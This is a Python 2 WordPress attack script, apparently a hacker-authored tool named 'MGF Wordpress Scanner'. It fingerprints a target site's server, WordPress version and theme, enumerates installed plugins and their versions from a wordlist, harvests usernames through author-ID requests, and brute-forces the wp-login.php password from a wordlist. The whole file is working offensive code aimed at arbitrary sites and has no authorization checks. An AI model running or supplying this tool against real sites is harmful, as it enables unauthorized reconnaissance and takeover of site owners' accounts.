#!/usr/bin/python
import requests,sys,time,socket,os,re,colorama
from collections import OrderedDict as get
from colorama import Fore, Back, Style , init
colorama.init()

# MGF Wordpress Scanner v 2.9.1 Fixed and Rewrite
# Coded by dogo h@ck
#"+------------------------------------+"
#"|          MGF Wp-Scanner            |"
#"|                      ______________|"
#"|                     |_v2.9.1 Fixed_|"
#"+------------------------------------+"

w = ['|','/','-','\\']
P = []

try :
	option = sys.argv[1]
except:
	print 'Error Try "Python MWS.py -h" for more information'
	exit()
	
def start():
	for i in w*2 :
		sys.stdout.write("\r[%s] Start MGF WordPress Scanner" % i)
		time.sleep(0.5)
	testwp()
	
def clearing():
	start()
	if os.name == "posix":
		clearing = 'clear'
	else:
		clearing = 'cls'
	os.system(clearing)
	
def timer():
	now = time.localtime(time.time())
	return time.asctime(now)
	
def vers(url,o):
	e = requests.get(url)
	n = re.findall(r'Stable tag: (.*?)\n',e.text)
	if n:
		o = n[0]
		return o
		
def git(url):
	x = requests.get(url)
	url = x.status_code
	return url
	
def wpver():
	try :
		ret = host + '/readme.html'
		ver = requests.get(ret)
		response = ver.text
		version = re.findall("(</a>\n\t<br />(.*?)\n</h1>)", response) 
		for i in version:
			print Fore.WHITE + '\n[+] WordPress =>' + Fore.GREEN + i[1] 
	except:
		print (Fore.WHITE + '\n[+] WordPress =>' + Fore.RED +'Unknown')
		
def gwp():
	global host
	try :
		host = sys.argv[2]
	except: 
		print '\nSee Help \nPython MWS.py -h '
		exit()
	clearing()
	r = requests.get(host)
	r2 = r.headers['Server']
	r3 = re.findall('/wp-content/themes/(.*?)/', r.text)
	if r3:
		theme = r3[0] + '\n'
	else:
		theme = 'Unknown\n'
	print Fore.WHITE + Style.BRIGHT 
	print '\n[+] Started : ',timer()
	print '\n[+] Host : ',  (Fore.GREEN + sys.argv[2])
	ip = host.replace("http://","").rsplit("/",2)[0]
	print Fore.WHITE + '\n[+] Host IP :' , Fore.CYAN  + socket.gethostbyname(ip)
	print Fore.WHITE + '\n[+] Server :' , Fore.YELLOW + r2
	wpver()
	print Fore.WHITE +'\n[+] Theme in Use :' , Fore.RED , theme
	
def testwp():
	t = host + 'license'
	try :
		test = requests.get(t)
	except:
		print '\n[+] No connection'
		sys.exit()
	r = test.text
	j = re.findall(r'WordPress - Web publishing software',r)
	if j :
		print '\n[+] Ok '
		time.sleep(2)
	else:
		print "\n[-] This site doesn't use WordPress"
		sys.exit(0)
		
def scan(PFile):
	gwp()
	Dir = os.path.dirname(os.path.realpath(__file__)) + os.path.sep
	File = open(Dir + PFile, 'r')
	p = open(Dir + PFile, 'r')
	s = len(p.readlines())
	x = 1
	Path = host + '/wp-content/plugins/'
	print Fore.WHITE + '\n[+] Scanning: ' + Fore.BLUE + 'Plugins ' + Fore.WHITE + '\n'
	for i in File.read().split('\n'):
		v = git(Path + i)
		E = x*100/s
		sys.stdout.write("\r[+] Done : %s" % E + '%')
		if x == int(s):
			break
		x +=1
		if v == 200:
			P.append(i)
			r = vers(Path + i + '/readme.txt','')
			P.append(r)
	if P == []:
		sys.stdout.write("\r[+] Not Found Any Plugins : \n")
	else :
		F = int(len(P))/2
		sys.stdout.write("\r[+] Plugins Was Found : %s\n" % F)
	o = 1
	w = 0
	for u in P:
		try:
			y = P
			sys.stdout.write(Fore.WHITE + '\n\r\t\t ' + Fore.CYAN + '> ' + Fore.GREEN + '%s' % y[w])
			sys.stdout.write(Fore.WHITE+'\tVersion ')
			sys.stdout.write('[ '+Fore.YELLOW + '%s' %y[o] +Fore.WHITE + ' ]\n' )
			o +=2
			w +=2
		except:
			pass
	print Fore.WHITE + '\n[+] Finish at :',timer()
	
def user():
	gwp()
	h = host + "/?author="
	i = 1
	print Fore.WHITE + '\n[+] Getting Users: '
	while i <= 20 :
		try :
			b = h + str(i)
			f = requests.get(b)
			f.text
			t = re.findall(r'<body class="archive author author-(.*?) author-'+str(i),f.text)
			print '\n[+] User ' + str(i) + Fore.GREEN + " " +t[0]
		except:
			break
		i += 1
	print Fore.WHITE + '\n[+] Finish at :',timer()
	
def index():
	gwp()
	inx = requests.get(host) 
	htm = inx.text
	r = re.findall(r'/wp-content/plugins/(.*?)/', htm)
	Path = host + '/wp-content/plugins/'
	if r :
		for u in list(get.fromkeys(r)):
			sys.stdout.write(Fore.WHITE + '\n\r[+] Found : ' + Fore.GREEN + '%s' % u)
			sys.stdout.write(Fore.WHITE+'\tVersion ')
			r = vers(Path + u + '/readme.txt','')
			sys.stdout.write('[ '+Fore.YELLOW + '%s' %r +Fore.WHITE + ' ]\n' )	
	else :
		print 'Not Found any plugins !'
	print Fore.WHITE + '\n[+] Finish at :',timer()
	
def BruteForce():
	gwp()
	Dir = os.path.dirname(os.path.realpath(__file__)) + os.path.sep
	url = host+'/wp-login.php'
	File = open(Dir + 'wordlist.txt', 'r')
	user = sys.argv[2]
	for p in File.read().split('\n'):
		payload = {'log': sys.argv[3], 'pwd': p}
		bf = requests.post(url, data=payload)
		k = re.search('(<strong>ERROR</strong>)',bf.text)
		sys.stdout.write(Fore.YELLOW+"\r[*] Trying %s... " % p)
		if k :
			pass
		elif k == False: 
			
			sys.stdout.write('\r[-] Not Found Any Password ' )
			print Fore.WHITE + '\n[+] Finish at :',timer()
			sys.exit(1)
		else:
			sys.stdout.write(Fore.GREEN+'\r[+] Password Found: %s' % p )
			print Fore.WHITE + '\n[+] Finish at :',timer()
			sys.exit(1)
			 
if option == '-h':
		print "\nUsage: Python MWS.py <Option> <Site> " 
		print "\nEx: Python MWS.py "+Fore.YELLOW+Style.BRIGHT + "-p"+Fore.CYAN+" http://www.site.com/"
 		print Fore.GREEN+"\nOptions:-"
		print "\t"+Fore.YELLOW+"-p "+Fore.WHITE+": Scan Plugins\n"
		print "\t"+Fore.YELLOW+"-u "+Fore.WHITE+": Get USERs\n"
		print "\t"+Fore.YELLOW+"-b "+Fore.WHITE+": Bruteforce\n\n\tEx : "+Fore.YELLOW+"-b "+Fore.CYAN+"http://www.site.com/ "+Fore.YELLOW+"admin\n"
		print "\t"+Fore.YELLOW+"-g "+Fore.WHITE+": Get Plugins from index page\n"
		print "\t"+Fore.YELLOW+"-c "+Fore.WHITE+": Use Custom plugins file\n\n\tEx : "+Fore.YELLOW+"-c "+Fore.CYAN+"http://www.site.com/ "+Fore.YELLOW+"File.txt\n"
		print "\t"+Fore.YELLOW+"-h "+Fore.WHITE+": This help text"
		sys.exit(1)
if option == '-p':
	scan('plugins.txt')
if option == '-u':
	user()
if option == '-b':
	BruteForce()
if option == '-g':
	index()
if option == '-c':
	PFile = sys.argv[3]
	scan(PFile)
